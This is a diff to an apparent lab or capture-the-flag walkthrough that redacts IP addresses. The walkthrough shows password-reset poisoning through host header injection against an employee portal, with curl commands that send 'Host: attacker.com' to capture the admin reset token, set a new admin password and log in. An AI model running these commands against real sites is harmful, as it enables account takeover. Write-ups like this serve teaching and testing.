@@ -30,7 +30,7 @@ Gain authenticated access to the PUL Employee Portal as the `admin` role user, t
 
 Identify the running web service:
 ```bash
-nmap -sV -p 8080 203.x.x.10
+nmap -sV -p 8080 203.x.x.x
 curl -s -o /dev/null -w "%{http_code}" http://203.0.x.x:8080/
 ```
 
@@ -41,7 +41,7 @@ Navigate to the portal. Observe the login page, the `Forgot Password` link, and 
 Browse to:
 
 ```
-http://203.0.x.x:8080/forgot-password
+http://203.x.x.x:8080/forgot-password
 ```
 
 
@@ -56,7 +56,7 @@ The vulnerability: the application uses `request.headers.get('Host')` to constru
 
 **Craft the malicious request:**
 ```bash
-curl -s -X POST http://203.0.x.x:8080/forgot-password \
+curl -s -X POST http://203.x.x.x:8080/forgot-password \
   -H "Host: attacker.com" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "email=admin@prabalurja.in"
@@ -94,7 +94,7 @@ http://203.0.x.x:8080/reset-password?token=<TOKEN_VALUE>
 
 Or via curl:
 ```bash
-curl -s -X POST "http://203.0.x.x:8080/reset-password" \
+curl -s -X POST "http://203.x.x.x:8080/reset-password" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "token=<TOKEN_VALUE>&new_password=Hacked@12345"
 ```
@@ -114,7 +114,8 @@ curl -s -c cookies.txt -X POST http://203.0.x.x:8080/login \
 
 Or log in via browser. The admin dashboard loads.
 
-<img width="2531" height="1358" alt="image" src="https://github.com/user-attachments/assets/2bdac1c7-8bb0-48dc-891a-293552b4537c" />
+<img width="2522" height="1351" alt="image" src="https://github.com/user-attachments/assets/8be21cef-ae9f-4b06-81ed-ca3e04763ccb" />
+
 
 
 
@@ -124,7 +125,7 @@ On the admin dashboard, the **IT Infrastructure — Administrative View** panel 
 
 | Field | Value |
 |---|---|
-| Mail Relay Host | `203.0.x.x/24` |
+| Mail Relay Host | `203.x.x.x/24` |
 | Mail Relay Port | `25` |
 | Auth | Not required (v-Public subnet) |
 
